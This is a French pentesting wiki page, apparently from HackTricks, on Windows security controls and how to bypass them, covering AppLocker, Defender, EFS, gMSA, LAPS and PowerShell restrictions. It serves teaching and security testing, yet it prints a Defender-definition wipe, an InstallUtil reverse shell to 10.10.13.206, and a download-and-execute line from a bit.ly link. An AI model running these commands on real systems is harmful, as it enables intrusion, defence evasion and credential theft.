# Contrôles de sécurité Windows

{{#include ../banners/hacktricks-training.md}}

## Stratégie AppLocker

Une liste blanche d’applications est une liste de logiciels ou d’exécutables approuvés qui peuvent être présents et exécutés sur un système. Son objectif est de protéger l’environnement contre les malwares nuisibles et les logiciels non approuvés qui ne répondent pas aux besoins spécifiques de l’entreprise.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) est la **solution de liste blanche d’applications** de Microsoft. Elle permet aux administrateurs système de contrôler **quelles applications et quels fichiers les utilisateurs peuvent exécuter**. Elle offre un **contrôle granulaire** des exécutables, des scripts, des fichiers d’installation Windows, des DLL, des applications empaquetées et des programmes d’installation d’applications empaquetées.\
Les organisations **bloquent souvent cmd.exe et PowerShell.exe**, ainsi que l’accès en écriture à certains répertoires, **mais tout cela peut être contourné**.

### Vérifier

Vérifiez quels fichiers/extensions sont sur liste noire ou sur liste blanche :

```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```

`Test-AppLockerPolicy` évalue des fichiers candidats pour une identité spécifique par rapport à une stratégie AppLocker. Testez le compte dont le jeton exécutera le payload, car les règles peuvent cibler des utilisateurs ou des groupes ; `Get-AppLockerFileInformation` est également utile pour examiner le chemin, le hash et les métadonnées de l’éditeur susceptibles de correspondre aux règles.<sup>[[5]](#references)</sup>

```powershell
$policy = Get-AppLockerPolicy -Effective
$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
Test-AppLockerPolicy -PolicyObject $policy -Path C:\Users\Public\payload.exe -User $user
Get-AppLockerFileInformation -Path C:\Users\Public\payload.exe | Format-List
```

Avant de considérer un résultat de test refusé comme un blocage effectif, vérifiez le **mode d’application effectif de cette collection de règles** et le service Application Identity. `AuditOnly` évalue les règles, mais autorise toujours l’exécution, tandis que `NotConfigured` n’équivaut pas à une désactivation lorsque cette collection contient des règles.<sup>[[7]](#references)</sup> Si `AppIDSvc` est arrêté, AppLocker n’applique pas les règles.<sup>[[9]](#references)</sup> Ces vérifications permettent de distinguer un contournement réel d’une stratégie qui n’a jamais bloqué le fichier.

```powershell
(Get-AppLockerPolicy -Effective).RuleCollections | Select-Object CollectionType, EnforcementMode
Get-Service AppIDSvc
Get-AppLockerFileInformation -EventLog -EventType Audited -Statistics
```

Pour un test d’exécution contrôlé, comparez le journal des événements AppLocker : **8003/8006** signifient que l’EXE/DLL ou le script/MSI aurait été bloqué en mode audit ; **8004/8007** signifient qu’il a effectivement été bloqué. Testez le même type de fichier et la même identité que pour le chemin d’exécution prévu.<sup>[[8]](#references)</sup>

Ce chemin de registre contient les configurations et les stratégies appliquées par AppLocker, ce qui permet d’examiner l’ensemble actuel des règles appliquées sur le système :

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Contournement

- **Dossiers accessibles en écriture** utiles pour contourner la stratégie AppLocker : si AppLocker autorise l’exécution de tout élément dans `C:\Windows\System32` ou `C:\Windows`, il existe des **dossiers accessibles en écriture** que vous pouvez utiliser pour **contourner cette stratégie**.

```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```

- Les binaires [**« LOLBAS »**](https://lolbas-project.github.io/) **couramment considérés comme fiables** peuvent également être utiles pour contourner AppLocker.
- **Des règles mal écrites peuvent également être contournées**
  - Par exemple, avec **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, vous pouvez créer un **dossier appelé `allowed`** n’importe où : il sera autorisé.
  - Les organisations se concentrent souvent sur le **blocage de l’exécutable `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, mais oublient les [**autres emplacements de l’exécutable PowerShell**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations), tels que `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` ou `PowerShell_ISE.exe`.
- **L’application des règles aux DLL est très rarement activée**, car elle peut alourdir le système et nécessite de nombreux tests pour s’assurer que rien ne sera interrompu. L’utilisation de **DLL comme backdoors aidera donc à contourner AppLocker**.
- Vous pouvez utiliser [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ou [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) pour **exécuter du code Powershell** dans n’importe quel processus et contourner AppLocker. Pour plus d’informations, consultez : [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Stockage des identifiants

### Security Accounts Manager (SAM)

Les identifiants locaux sont présents dans ce fichier ; les mots de passe y sont hachés.

### Local Security Authority (LSA) - LSASS

Les **identifiants** (hachés) sont **enregistrés** dans la **mémoire** de ce sous-système pour permettre l’authentification unique (Single Sign-On).\
La **LSA** administre la **stratégie de sécurité** locale (stratégie de mots de passe, autorisations des utilisateurs...), l’**authentification**, les **jetons d’accès**...\
La LSA est chargée de **vérifier** les identifiants fournis dans le fichier **SAM** (pour une connexion locale) et de **communiquer** avec le **contrôleur de domaine** pour authentifier un utilisateur du domaine.

Les **identifiants** sont **enregistrés** dans le **processus LSASS** : tickets Kerberos, hachages NT et LM, mots de passe facilement déchiffrables.

### Secrets LSA

La LSA peut enregistrer certains identifiants sur le disque :

- Mot de passe du compte ordinateur Active Directory (contrôleur de domaine inaccessible).
- Mots de passe des comptes des services Windows
- Mots de passe des tâches planifiées
- Autres (mot de passe des applications IIS...)

### NTDS.dit

Il s’agit de la base de données d’Active Directory. Elle est présente uniquement sur les contrôleurs de domaine.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) est un antivirus disponible dans Windows 10 et Windows 11, ainsi que dans certaines versions de Windows Server. Il **bloque** les outils de pentesting courants tels que **`WinPEAS`**. Il existe toutefois des moyens de **contourner ces protections**.

### Vérification

Pour vérifier l’**état** de **Defender**, vous pouvez exécuter la cmdlet PS **`Get-MpComputerStatus`** (vérifiez la valeur de **`RealTimeProtectionEnabled`** pour savoir s’il est actif) :

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Vous pouvez également exécuter la commande suivante pour l’énumérer :

```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

## Système de fichiers chiffré (EFS)

EFS protège les fichiers par chiffrement à l'aide d'une **clé symétrique** appelée **File Encryption Key (FEK)**. Cette clé est chiffrée avec la **clé publique** de l'utilisateur et stockée dans les métadonnées NTFS `$EFS` du fichier (`$LOGGED_UTILITY_STREAM`), et **non** dans un flux de données alternatif `$DATA` ordinaire.<sup>[[10]](#references)</sup> Lorsqu'un déchiffrement est nécessaire, la **clé privée** correspondante du certificat numérique de l'utilisateur déverrouille la FEK. Un agent de récupération des données (DRA) configuré dispose d'une copie chiffrée distincte de la FEK dans le champ de récupération des données.<sup>[[13]](#references)</sup>

**Scénarios de déchiffrement sans intervention de l'utilisateur** :

- Lorsque des fichiers ou des dossiers sont déplacés vers un système de fichiers non-EFS, comme [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), ils sont automatiquement déchiffrés.
- Les fichiers chiffrés envoyés sur le réseau via le protocole SMB/CIFS sont déchiffrés avant leur transmission.

Cette méthode de chiffrement permet au propriétaire d'accéder **de manière transparente** aux fichiers chiffrés. Cependant, changer simplement le mot de passe du propriétaire et ouvrir une session ne permet pas de les déchiffrer.

**Points clés** :

- EFS utilise une FEK symétrique, chiffrée avec la clé publique de l'utilisateur.
- Le déchiffrement utilise la clé privée de l'utilisateur pour accéder à la FEK.
- Le déchiffrement automatique a lieu dans certaines conditions, par exemple lors d'une copie vers FAT32 ou d'une transmission réseau.
- Le propriétaire peut accéder aux fichiers chiffrés sans étape supplémentaire.

### Vérifier les informations EFS

Ne déduisez pas l'utilisation d'EFS à partir de `%APPDATA%\Microsoft\Protect` : ce dossier stocke les clés principales DPAPI utilisées par de nombreuses fonctionnalités Windows.<sup>[[19]](#references)</sup> Inspectez plutôt un fichier chiffré avec `cipher /c "C:\path\file"` pour afficher les certificats de l'utilisateur et de récupération associés. Les commandes `cipher /e` et `cipher /d` chiffrent et déchiffrent les fichiers pour un principal qui possède la clé privée correspondante.<sup>[[11]](#references)</sup>

### Déchiffrer des fichiers EFS

Si `cipher /c` affiche un certificat de récupération et que vous possédez sa **clé privée DRA correspondante** dans un fichier PFX, importez ce fichier PFX dans le magasin de certificats de l'utilisateur actuel, puis déchiffrez le fichier.<sup>[[11]](#references)[[12]](#references)</sup> Un certificat DRA généré récemment ne peut pas déchiffrer d'anciens fichiers : sa clé publique doit déjà avoir été incluse lors du chiffrement du fichier. L'accès via les ACL NTFS ou la réinitialisation du mot de passe du compte ne fournissent pas à eux seuls la clé privée requise.<sup>[[13]](#references)</sup>

```cmd
cipher /c "C:\path\file"
certutil -user -importPFX My recovery.pfx
cipher /d "C:\path\file"
```

#### Être l'autorité système

Cette approche nécessite que l’**utilisateur victime** **exécute** un **processus** sur l’hôte. Si c’est le cas, depuis une session `meterpreter`, vous pouvez usurper le token de processus de l’utilisateur (`impersonate_token` depuis `incognito`). Vous pouvez également effectuer un `migrate` vers le processus de l’utilisateur.

#### Connaître le mot de passe de l’utilisateur

Mimikatz peut importer le certificat et la clé privée de l’utilisateur, puis les utiliser pour déchiffrer les fichiers protégés par EFS.<sup>[[2]](#references)</sup>

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Comptes de service gérés de groupe (gMSA)

Microsoft a développé les **comptes de service gérés de groupe (gMSA)** pour simplifier la gestion des comptes de service dans les infrastructures informatiques. Contrairement aux comptes de service traditionnels, pour lesquels le paramètre « **Le mot de passe n’expire jamais** » est souvent activé, les gMSA offrent une solution plus sûre et plus facile à gérer :

- **Gestion automatique des mots de passe** : les gMSA utilisent un mot de passe complexe de 240 octets, renouvelé normalement tous les 30 jours. Les contrôleurs de domaine le dérivent à partir du matériel de clé KDS, ce qui élimine les mises à jour manuelles du mot de passe.<sup>[[16]](#references)[[20]](#references)</sup>
- **Sécurité renforcée** : ces comptes ne peuvent pas être verrouillés et ne peuvent pas être utilisés pour des connexions interactives, ce qui renforce leur sécurité.
- **Prise en charge de plusieurs hôtes** : les gMSA peuvent être partagés entre plusieurs hôtes, ce qui les rend idéaux pour les services exécutés sur plusieurs serveurs.
- **Prise en charge des tâches planifiées** : contrairement aux comptes de service gérés, les gMSA peuvent exécuter des tâches planifiées.
- **Gestion simplifiée des SPN** : le système met automatiquement à jour le Service Principal Name (SPN) en cas de changement des informations sAMaccount de l’ordinateur ou de son nom DNS, ce qui simplifie la gestion des SPN.

Un contrôleur de domaine construit l’attribut LDAP _**msDS-ManagedPassword**_ lors de sa lecture, à partir du matériel de mot de passe dérivé de KDS ; cette valeur n’est pas un mot de passe stocké séparément. Elle change normalement tous les 30 jours.<sup>[[20]](#references)</sup> Le [MSDS-MANAGEDPASSWORD_BLOB](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) renvoyé n’est **pas un mot de passe chiffré** : son champ `CurrentPassword` contient le mot de passe en clair.<sup>[[14]](#references)</sup> Les droits d’accès sont vérifiés par rapport à `msDS-GroupMSAMembership` ; tout principal disposant de droits de récupération est donc concerné, et pas seulement les administrateurs ou les hôtes exécutant le service.<sup>[[15]](#references)</sup> La connexion LDAP doit assurer la confidentialité, par exemple via LDAPS ou le scellement SASL.<sup>[[20]](#references)</sup>

Pour la dérivation hors ligne du mot de passe après l’exposition de la clé racine KDS, consultez [Golden gMSA/dMSA](active-directory-methodology/golden-dmsa-gmsa.md).

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)<sup>[[3]](#references)</sup>

Vous pouvez lire ce mot de passe avec [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)** :**

```
/GMSAPasswordReader --AccountName jkohler
```

[**Trouver plus d’informations dans cet article**](https://cube0x0.github.io/Relaying-for-gMSA/)<sup>[[3]](#references)</sup>

Consultez également cette [page web](https://cube0x0.github.io/Relaying-for-gMSA/) pour savoir comment effectuer une **NTLM relay attack** afin de **lire** le **mot de passe** de **gMSA**.<sup>[[3]](#references)</sup>

## LAPS

Lors de l’énumération, distinguez **Microsoft LAPS legacy** de l’implémentation native **Windows LAPS**. Windows LAPS a été publié dans les mises à jour Windows du 11 avril 2023 et peut sauvegarder le mot de passe d’un administrateur local géré dans **Windows Server Active Directory** ou **Microsoft Entra ID**. Dans les déploiements adossés à AD, il peut également chiffrer les mots de passe, conserver un historique des mots de passe chiffrés et gérer le mot de passe DSRM d’un contrôleur de domaine. Le MSI legacy téléchargeable est obsolète sur les versions récentes de Windows, même si Windows LAPS peut fonctionner en mode d’émulation legacy.<sup>[[6]](#references)</sup>

Comme Microsoft LAPS legacy et Windows LAPS sont deux implémentations distinctes, identifiez celle qui est déployée avant d’appliquer des attaques spécifiques aux attributs ou aux cmdlets. La page liée traite de la découverte, de l’énumération des ACL, de la récupération, de la modification de l’expiration et de la récupération hors ligne, sans répéter ces procédures ici.<sup>[[6]](#references)</sup>

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

Le [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) de PowerShell **restreint de nombreuses fonctionnalités** nécessaires pour utiliser PowerShell efficacement, notamment en bloquant les objets COM, en n’autorisant que les types .NET approuvés, les workflows basés sur XAML, les classes PowerShell, et bien plus encore.

### **Vérification**

```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```

### Bypass

`powershell.exe -Version 2` était une rétrogradation héritée, disponible uniquement sur les hôtes où le moteur PowerShell 2 facultatif était installé. Il n’est plus inclus dans les versions à jour de Windows 11 24H2 ou Windows Server 2025 ; ne le considérez pas comme un contournement CLM actuel.<sup>[[17]](#references)</sup> Avec le contrôle des applications, PowerShell exécute le code non approuvé en Constrained Language, tandis que les scripts approuvés par la stratégie peuvent s’exécuter en Full Language.<sup>[[18]](#references)</sup>

Pour les configurations plus anciennes, vous pouvez utiliser [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Pour le compiler, vous devrez peut-être** **ajouter une référence** (_**Add a Reference**_) -> _Browse_ -> _Browse_ -> ajouter `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` et **changer le projet pour .Net4.5**.

#### Direct bypass:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```

#### Reverse shell:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```

Vous pouvez utiliser [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ou [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) pour **exécuter du code Powershell** dans n’importe quel processus et contourner le mode contraint. Pour en savoir plus, consultez : [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Stratégie d’exécution PS

Par défaut, elle est définie sur **restricted.** Principales façons de contourner cette stratégie :<sup>[[4]](#references)</sup>

```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```

Vous en trouverez davantage [ici](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[4]](#references)</sup>

## Security Support Provider Interface (SSPI)

Il s’agit de l’API qui peut être utilisée pour authentifier les utilisateurs.

Le SSPI se charge de trouver le protocole adéquat pour deux machines qui souhaitent communiquer. La méthode privilégiée est Kerberos. Le SSPI négocie ensuite le protocole d’authentification à utiliser. Ces protocoles d’authentification, appelés Security Support Provider (SSP), sont installés sur chaque machine Windows sous la forme d’une DLL. Les deux machines doivent prendre en charge le même protocole pour pouvoir communiquer.

### Principaux SSP

- **Kerberos** : le protocole privilégié
  - %windir%\Windows\System32\kerberos.dll
- **NTLMv1** et **NTLMv2** : pour des raisons de compatibilité
  - %windir%\Windows\System32\msv1_0.dll
- **Digest** : pour les serveurs web et LDAP, mot de passe sous la forme d’un hash MD5
  - %windir%\Windows\System32\Wdigest.dll
- **Schannel** : SSL et TLS
  - %windir%\Windows\System32\Schannel.dll
- **Negotiate** : utilisé pour négocier le protocole à utiliser (Kerberos ou NTLM, Kerberos étant le protocole par défaut)
  - %windir%\Windows\System32\lsasrv.dll

#### La négociation peut proposer plusieurs méthodes ou une seule.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) est une fonctionnalité qui affiche une **demande de consentement pour les activités nécessitant une élévation de privilèges**.

{{#ref}}
authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}




## References

- [1] [Contourner AppLocker et le mode de langage restreint de PowerShell](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [2] [Comment déchiffrer des fichiers EFS](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [3] [Relais pour gMSA](https://cube0x0.github.io/Relaying-for-gMSA/)
- [4] [15 façons de contourner la stratégie d’exécution de PowerShell](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [5] [Utiliser les cmdlets AppLocker de Windows PowerShell](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/use-the-applocker-windows-powershell-cmdlets)
- [6] [Présentation de Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview)
- [7] [Utiliser les règles AppLocker](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/working-with-applocker-rules)
- [8] [Utiliser l’Observateur d’événements avec AppLocker](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/using-event-viewer-with-applocker)
- [9] [Processus et interactions d’AppLocker](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/applocker-processes-and-interactions)
- [10] [Flux de fichiers (systèmes de fichiers locaux)](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams)
- [11] [Commande Cipher](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cipher)
- [12] [Commande Certutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
- [13] [Sauvegarder la clé privée EFS de l’agent de récupération](https://learn.microsoft.com/en-us/troubleshoot/windows-server/certificates-and-public-key-infrastructure-pki/back-up-recovery-agent-efs-private-key)
- [14] [MSDS-MANAGEDPASSWORD_BLOB](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e)
- [15] [Attribut ms-DS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [16] [Sécuriser les comptes de service gérés de groupe](https://learn.microsoft.com/en-us/entra/architecture/service-accounts-group-managed)
- [17] [Fonctionnalités supprimées de Windows client](https://learn.microsoft.com/en-us/windows/whats-new/removed-features)
- [18] [Sécuriser PowerShell avec App Control](https://learn.microsoft.com/en-us/powershell/scripting/security/app-control/application-control)
- [19] [Événement 4693 et clés principales DPAPI](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4693)
- [20] [Construction de msDS-ManagedPassword](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/9cd2fc5e-7305-4fb8-b233-2a60bc3eec68)
{{#include ../banners/hacktricks-training.md}}
